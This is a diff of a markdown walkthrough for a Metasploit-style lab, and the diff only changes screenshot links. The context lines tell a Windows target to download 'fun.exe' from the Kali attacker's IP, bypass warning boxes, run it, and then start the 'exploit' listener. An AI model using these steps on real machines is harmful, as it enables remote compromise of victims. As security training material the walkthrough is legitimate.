@@ -62,11 +62,13 @@ exploit
 
 On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.4/fun.exe The file "fun.exe" downloads.
 
-<img width="863" alt="image" src="https://github.com/user-attachments/assets/f400d3ac-5d05-460a-8a24-f405783608d2">
+<img width="368" alt="image" src="https://github.com/user-attachments/assets/1a211cb7-e49c-4dfb-a4eb-9914aa5fe3dc">
+
 
 Bypass any warning boxes, double-click the file, and allow it to run.
 
-<img width="863" alt="image" src="https://github.com/user-attachments/assets/76fa470b-736b-446c-b10c-2cf034799234">
+<img width="370" alt="image" src="https://github.com/user-attachments/assets/ae00f0c5-39d5-4717-a921-4f9b5a386475">
+
 
 On kali give the command exploit
 
